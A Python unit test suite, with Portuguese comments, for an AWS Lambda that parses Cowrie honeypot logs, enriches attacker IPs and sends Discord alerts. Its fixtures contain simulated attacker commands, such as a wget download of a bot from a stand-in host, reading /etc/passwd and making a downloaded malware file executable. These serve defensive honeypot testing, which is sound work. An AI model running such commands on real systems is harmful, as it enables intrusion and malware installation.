"""
Testes Unitários Abrangentes para a Função AWS Lambda (lambda/handler.py)
Cobre 100% dos fluxos de execução:
- lambda_handler com eventos S3 (sucesso, falha de download, falha de upload)
- Resolução GeoIP com mock de HTTP, cache em memória e tratamento de falhas
- Consulta AbuseIPDB com API key configurada, HTTP errors (429/401) e fallback
- Notificação de webhook no Discord com cálculo de cor de severidade e resiliência
- Parser de registros brutos Cowrie (downloads de arquivos, comandos, limites de tamanho, TTL)
"""

import json
import os
import sys
import unittest
from decimal import Decimal
from unittest.mock import MagicMock, patch
import urllib.error

# Importa o módulo da Lambda
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lambda"))
import handler


class TestLambdaHandlerFull(unittest.TestCase):
    def setUp(self):
        # Limpa caches em memória antes de cada teste
        handler.GEOIP_CACHE.clear()
        handler.ABUSE_CACHE.clear()

    # -------------------------------------------------------------------------
    # 1. Testes de GeoIP (get_geoip_info)
    # -------------------------------------------------------------------------
    def test_geoip_internal_network_ips(self):
        """Valida que faixas de IP RFC1918 e loopback retornam metadados locais sem requisição de rede"""
        private_ips = ["127.0.0.1", "10.0.1.50", "172.16.2.3", "192.168.0.1"]
        for ip in private_ips:
            info = handler.get_geoip_info(ip)
            self.assertEqual(info["country_code"], "LOCAL")
            self.assertEqual(info["country_name"], "Rede Interna")
            self.assertEqual(info["city"], "Localhost")
            self.assertEqual(info["latitude"], Decimal("0.0"))
            self.assertEqual(info["longitude"], Decimal("0.0"))

    @patch("urllib.request.urlopen")
    def test_geoip_public_ip_success(self, mock_urlopen):
        """Valida parsing de resposta bem-sucedida da API GeoIP pública com preenchimento de cache"""
        mock_resp = MagicMock()
        mock_resp.read.return_value = json.dumps({
            "success": True,
            "country_code": "DE",
            "country": "Germany",
            "city": "Frankfurt",
            "latitude": 50.1109,
            "longitude": 8.6821,
            "connection": {"isp": "Deutsche Telekom"}
        }).encode("utf-8")
        mock_resp.__enter__.return_value = mock_resp
        mock_urlopen.return_value = mock_resp

        ip = "198.51.100.99"
        info = handler.get_geoip_info(ip)

        self.assertEqual(info["country_code"], "DE")
        self.assertEqual(info["country_name"], "Germany")
        self.assertEqual(info["city"], "Frankfurt")
        self.assertEqual(info["latitude"], Decimal("50.1109"))
        self.assertEqual(info["longitude"], Decimal("8.6821"))
        self.assertEqual(info["isp"], "Deutsche Telekom")

        # Verifica cache em memória: segunda chamada não deve acionar urlopen novamente
        mock_urlopen.reset_mock()
        cached_info = handler.get_geoip_info(ip)
        self.assertEqual(cached_info, info)
        mock_urlopen.assert_not_called()

    @patch("urllib.request.urlopen")
    def test_geoip_public_ip_api_failure_response(self, mock_urlopen):
        """Valida fallback gracioso quando a API retorna success=False"""
        mock_resp = MagicMock()
        mock_resp.read.return_value = json.dumps({"success": False, "message": "reserved IP"}).encode("utf-8")
        mock_resp.__enter__.return_value = mock_resp
        mock_urlopen.return_value = mock_resp

        info = handler.get_geoip_info("203.0.113.1")
        self.assertEqual(info["country_code"], "XX")
        self.assertEqual(info["country_name"], "Desconhecido")
        self.assertEqual(info["city"], "Desconhecido")
        self.assertEqual(info["latitude"], Decimal("0.0"))
        self.assertEqual(info["longitude"], Decimal("0.0"))

    @patch("urllib.request.urlopen", side_effect=urllib.error.URLError("Network timeout"))
    def test_geoip_network_exception_fallback(self, mock_urlopen):
        """Valida fallback resiliente caso ocorra erro de rede ou timeout"""
        info = handler.get_geoip_info("203.0.113.2")
        self.assertEqual(info["country_code"], "XX")
        self.assertEqual(info["country_name"], "Desconhecido")

    # -------------------------------------------------------------------------
    # 2. Testes de AbuseIPDB (get_abuseipdb_score)
    # -------------------------------------------------------------------------
    def test_abuseipdb_no_api_key(self):
        """Valida retorno neutro caso a chave de API não esteja configurada"""
        with patch.object(handler, "ABUSEIPDB_API_KEY", ""):
            res = handler.get_abuseipdb_score("198.51.100.10")
            self.assertEqual(res["abuse_score"], 0)
            self.assertEqual(res["total_reports"], 0)
            self.assertFalse(res["is_whitelisted"])
            self.assertFalse(res["abuse_checked"])

    @patch("urllib.request.urlopen")
    def test_abuseipdb_with_api_key_success(self, mock_urlopen):
        """Valida consulta com API key ativa e preenchimento de cache"""
        mock_resp = MagicMock()
        mock_resp.read.return_value = json.dumps({
            "data": {
                "abuseConfidenceScore": 95,
                "totalReports": 340,
                "isWhitelisted": False
            }
        }).encode("utf-8")
        mock_resp.__enter__.return_value = mock_resp
        mock_urlopen.return_value = mock_resp

        with patch.object(handler, "ABUSEIPDB_API_KEY", "test_dummy_key_123"):
            ip = "198.51.100.20"
            res = handler.get_abuseipdb_score(ip)

            self.assertEqual(res["abuse_score"], 95)
            self.assertEqual(res["total_reports"], 340)
            self.assertFalse(res["is_whitelisted"])
            self.assertTrue(res["abuse_checked"])

            # Verifica cache
            mock_urlopen.reset_mock()
            cached_res = handler.get_abuseipdb_score(ip)
            self.assertEqual(cached_res, res)
            mock_urlopen.assert_not_called()

    @patch("urllib.request.urlopen")
    def test_abuseipdb_http_error_fallback(self, mock_urlopen):
        """Valida tratamento seguro de HTTPError (ex: 429 Rate Limit ou 401 Unauthorized)"""
        mock_urlopen.side_effect = urllib.error.HTTPError(
            url="https://api.abuseipdb.com", code=429, msg="Too Many Requests", hdrs={}, fp=None
        )

        with patch.object(handler, "ABUSEIPDB_API_KEY", "test_key"):
            res = handler.get_abuseipdb_score("198.51.100.21")
            self.assertEqual(res["abuse_score"], 0)
            self.assertEqual(res["total_reports"], 0)
            self.assertFalse(res["abuse_checked"])

    @patch("urllib.request.urlopen", side_effect=Exception("Generic failure"))
    def test_abuseipdb_generic_exception_fallback(self, mock_urlopen):
        """Valida fallback contra exceções genéricas de conexão"""
        with patch.object(handler, "ABUSEIPDB_API_KEY", "test_key"):
            res = handler.get_abuseipdb_score("198.51.100.22")
            self.assertEqual(res["abuse_score"], 0)
            self.assertFalse(res["abuse_checked"])

    # -------------------------------------------------------------------------
    # 3. Testes de Notificação Discord (send_discord_notification)
    # -------------------------------------------------------------------------
    def test_send_discord_notification_no_webhook(self):
        """Valida que nenhuma requisição é feita se DISCORD_WEBHOOK_URL estiver vazio"""
        with patch.object(handler, "DISCORD_WEBHOOK_URL", ""):
            with patch("urllib.request.urlopen") as mock_url:
                handler.send_discord_notification({"successful_logins": 1, "commands": ["id"]})
                mock_url.assert_not_called()

    def test_send_discord_notification_skips_failed_probes_without_commands(self):
        """Garante que varreduras simples sem login e sem comandos não disparam alerta no Discord"""
        with patch.object(handler, "DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/dummy"):
            with patch("urllib.request.urlopen") as mock_url:
                handler.send_discord_notification({
                    "ip_address": "1.2.3.4",
                    "successful_logins": 0,
                    "commands": []
                })
                mock_url.assert_not_called()

    @patch("urllib.request.urlopen")
    def test_send_discord_notification_critical_event(self, mock_urlopen):
        """Valida envio de alerta com formato correto, color code e campos de auditoria"""
        payload_captured = {}

        def capture_post(req, timeout=4):
            nonlocal payload_captured
            payload_captured = json.loads(req.data.decode("utf-8"))
            mock_resp = MagicMock()
            mock_resp.__enter__.return_value = mock_resp
            return mock_resp

        mock_urlopen.side_effect = capture_post

        with patch.object(handler, "DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/dummy"):
            # Evento com abuso alto (score >= 80 -> cor vermelha 15158332)
            event_high_risk = {
                "ip_address": "198.51.100.50",
                "country_name": "Brazil",
                "abuse_score": 85,
                "successful_logins": 1,
                "commands": ["uname -a", "cat /etc/passwd"]
            }
            handler.send_discord_notification(event_high_risk)
            mock_urlopen.assert_called_once()
            self.assertIn("embeds", payload_captured)
            embed = payload_captured["embeds"][0]
            self.assertEqual(embed["color"], 15158332)
            self.assertIn("198.51.100.50", embed["fields"][0]["value"])

            # Evento com abuso menor (score < 80 -> cor laranja 16753920)
            mock_urlopen.reset_mock()
            event_medium_risk = {
                "ip_address": "198.51.100.51",
                "country_name": "Germany",
                "abuse_score": 40,
                "successful_logins": 0,
                "commands": ["ls -la"]
            }
            handler.send_discord_notification(event_medium_risk)
            embed2 = payload_captured["embeds"][0]
            self.assertEqual(embed2["color"], 16753920)

    @patch("urllib.request.urlopen", side_effect=Exception("Discord API error"))
    def test_send_discord_notification_handles_failure(self, mock_urlopen):
        """Valida que erros na API do Discord não causam interrupção da execução"""
        with patch.object(handler, "DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/dummy"):
            event = {
                "ip_address": "198.51.100.52",
                "country_name": "China",
                "abuse_score": 100,
                "successful_logins": 1,
                "commands": ["wget http://bad.com/bot"]
            }
            # Não deve lançar exceção
            handler.send_discord_notification(event)

    # -------------------------------------------------------------------------
    # 4. Testes de Parser Cowrie (parse_cowrie_records)
    # -------------------------------------------------------------------------
    def test_parse_cowrie_records_file_download_and_caps(self):
        """Valida captura de download de arquivo, deduplicação de comandos e teto em listas"""
        lines = [
            json.dumps({
                "eventid": "cowrie.session.file_download",
                "src_ip": "198.51.100.70",
                "session": "sess-download",
                "timestamp": "2026-10-12T10:00:00Z",
                "shasum": "abcd1234efgh5678",
                "destfile": "/tmp/malware.bin"
            }),
            json.dumps({
                "eventid": "cowrie.command.input",
                "src_ip": "198.51.100.70",
                "session": "sess-download",
                "timestamp": "2026-10-12T10:01:00Z",
                "input": "chmod +x /tmp/malware.bin"
            }),
            json.dumps({
                "eventid": "cowrie.command.input",
                "src_ip": "198.51.100.70",
                "session": "sess-download",
                "timestamp": "2026-10-12T10:02:00Z",
                "input": "chmod +x /tmp/malware.bin"  # duplicado
            })
        ]

        # Adiciona 25 senhas e usuários diferentes para testar os limites de tamanho (cap de 20)
        for i in range(25):
            lines.append(json.dumps({
                "eventid": "cowrie.login.failed",
                "src_ip": "198.51.100.70",
                "session": f"sess-{i}",
                "timestamp": f"2026-10-12T10:05:{i:02d}Z",
                "username": f"user_{i}",
                "password": f"pass_{i}"
            }))

        records = handler.parse_cowrie_records(lines)
        self.assertEqual(len(records), 1)
        atk = records[0]

        # Comandos deduplicados
        self.assertEqual(atk["commands"], ["chmod +x /tmp/malware.bin"])

        # Downloads
        self.assertEqual(atk["downloads_count"], 1)
        self.assertEqual(atk["downloads"][0]["sha256"], "abcd1234efgh5678")
        self.assertEqual(atk["downloads"][0]["path"], "/tmp/malware.bin")

        # Limites máximos respeitados
        self.assertLessEqual(len(atk["usernames"]), 20)
        self.assertLessEqual(len(atk["passwords"]), 20)

        # TTL presente
        self.assertIn("ttl_timestamp", atk)
        self.assertIsInstance(atk["ttl_timestamp"], int)

    # -------------------------------------------------------------------------
    # 5. Testes do Handler Principal Lambda (lambda_handler)
    # -------------------------------------------------------------------------
    @patch.object(handler, "s3_client")
    @patch.object(handler, "get_geoip_info")
    @patch.object(handler, "get_abuseipdb_score")
    @patch.object(handler, "send_discord_notification")
    def test_lambda_handler_e2e_success(self, mock_discord, mock_abuse, mock_geo, mock_s3):
        """Valida ciclo completo: download S3 -> parsing -> enriquecimento -> upload JSON Lines enriquecido"""
        bucket_name = "test-honeypot-logs-bucket"
        key_name = "cowrie-logs/year=2026/month=10/day=12/cowrie_sample.json"

        # Mock do S3 get_object
        raw_log_lines = (
            json.dumps({
                "eventid": "cowrie.login.success",
                "src_ip": "187.15.86.63",
                "session": "sess-live",
                "timestamp": "2026-10-12T12:00:00Z",
                "username": "root",
                "password": "secretpassword"
            }) + "\n" +
            json.dumps({
                "eventid": "cowrie.command.input",
                "src_ip": "187.15.86.63",
                "session": "sess-live",
                "timestamp": "2026-10-12T12:01:00Z",
                "input": "uname -a"
            }) + "\n"
        )

        mock_body = MagicMock()
        mock_body.read.return_value = raw_log_lines.encode("utf-8")
        mock_s3.get_object.return_value = {"Body": mock_body}

        # Mock de enriquecimento
        mock_geo.return_value = {
            "country_code": "BR",
            "country_name": "Brazil",
            "city": "Sao Paulo",
            "latitude": Decimal("-23.5505"),
            "longitude": Decimal("-46.6333"),
            "isp": "Claro Brasil"
        }
        mock_abuse.return_value = {
            "abuse_score": 10,
            "total_reports": 2,
            "is_whitelisted": False,
            "abuse_checked": True
        }

        s3_event = {
            "Records": [
                {
                    "s3": {
                        "bucket": {"name": bucket_name},
                        "object": {"key": key_name}
                    }
                }
            ]
        }

        result = handler.lambda_handler(s3_event, None)
        self.assertEqual(result["statusCode"], 200)
        self.assertEqual(result["total_processed"], 1)

        # Valida chamada do get_object
        mock_s3.get_object.assert_called_once_with(Bucket=bucket_name, Key=key_name)

        # Valida notificação do Discord acionada
        mock_discord.assert_called_once()

        # Valida put_object gravado no S3
        mock_s3.put_object.assert_called_once()
        put_kwargs = mock_s3.put_object.call_args[1]
        self.assertEqual(put_kwargs["Bucket"], bucket_name)
        self.assertEqual(put_kwargs["Key"], "enriched-telemetry/enriched_cowrie_sample.json")
        self.assertEqual(put_kwargs["ContentType"], "application/json")
        self.assertEqual(put_kwargs["ServerSideEncryption"], "AES256")

        # Valida que o corpo é JSON Lines compatível com Athena
        uploaded_lines = put_kwargs["Body"].decode("utf-8").strip().split("\n")
        self.assertEqual(len(uploaded_lines), 1)
        record = json.loads(uploaded_lines[0])
        self.assertEqual(record["ip_address"], "187.15.86.63")
        self.assertEqual(record["country_name"], "Brazil")
        self.assertEqual(record["city"], "Sao Paulo")
        self.assertEqual(record["login_attempts"], 1)
        self.assertEqual(record["successful_logins"], 1)
        self.assertIn("uname -a", record["commands"])

    @patch.object(handler, "s3_client")
    def test_lambda_handler_handles_s3_get_failure(self, mock_s3):
        """Valida que falha no S3 get_object é tratada sem travar o processamento dos demais records"""
        mock_s3.get_object.side_effect = Exception("NoSuchKey error")

        s3_event = {
            "Records": [
                {
                    "s3": {
                        "bucket": {"name": "test-bucket"},
                        "object": {"key": "cowrie-logs/missing-file.json"}
                    }
                }
            ]
        }

        result = handler.lambda_handler(s3_event, None)
        self.assertEqual(result["statusCode"], 200)
        self.assertEqual(result["total_processed"], 0)

    @patch.object(handler, "s3_client")
    def test_lambda_handler_ignores_non_cowrie_prefix(self, mock_s3):
        """Garante que objetos fora de cowrie-logs/ são ignorados para evitar loops infinitos"""
        s3_event = {
            "Records": [
                {
                    "s3": {
                        "bucket": {"name": "test-bucket"},
                        "object": {"key": "enriched-telemetry/enriched_cowrie.json"}
                    }
                },
                {
                    "s3": {
                        "bucket": {"name": "test-bucket"},
                        "object": {"key": "athena-query-results/query-123.csv"}
                    }
                }
            ]
        }

        result = handler.lambda_handler(s3_event, None)
        self.assertEqual(result["statusCode"], 200)
        self.assertEqual(result["total_processed"], 0)
        mock_s3.get_object.assert_not_called()

    @patch.object(handler, "s3_client")
    def test_lambda_handler_empty_or_malformed_event(self, mock_s3):
        """Valida resiliência a eventos S3 vazios ou com estrutura incompleta"""
        result_empty = handler.lambda_handler({}, None)
        self.assertEqual(result_empty["statusCode"], 200)
        self.assertEqual(result_empty["total_processed"], 0)

        result_malformed = handler.lambda_handler({"Records": [{"s3": {}}]}, None)
        self.assertEqual(result_malformed["statusCode"], 200)
        self.assertEqual(result_malformed["total_processed"], 0)

    @patch.object(handler, "s3_client")
    def test_lambda_handler_handles_s3_put_failure(self, mock_s3):
        """Valida tratamento seguro quando o put_object no S3 falha"""
        mock_body = MagicMock()
        mock_body.read.return_value = json.dumps({
            "eventid": "cowrie.login.failed",
            "src_ip": "198.51.100.99",
            "timestamp": "2026-10-12T12:00:00Z"
        }).encode("utf-8")
        mock_s3.get_object.return_value = {"Body": mock_body}
        mock_s3.put_object.side_effect = Exception("S3 Put Access Denied")

        s3_event = {
            "Records": [
                {
                    "s3": {
                        "bucket": {"name": "test-bucket"},
                        "object": {"key": "cowrie-logs/cowrie.json"}
                    }
                }
            ]
        }

        # Não deve lançar exceção fatal
        result = handler.lambda_handler(s3_event, None)
        self.assertEqual(result["statusCode"], 200)
        self.assertEqual(result["total_processed"], 1)


if __name__ == "__main__":
    unittest.main()
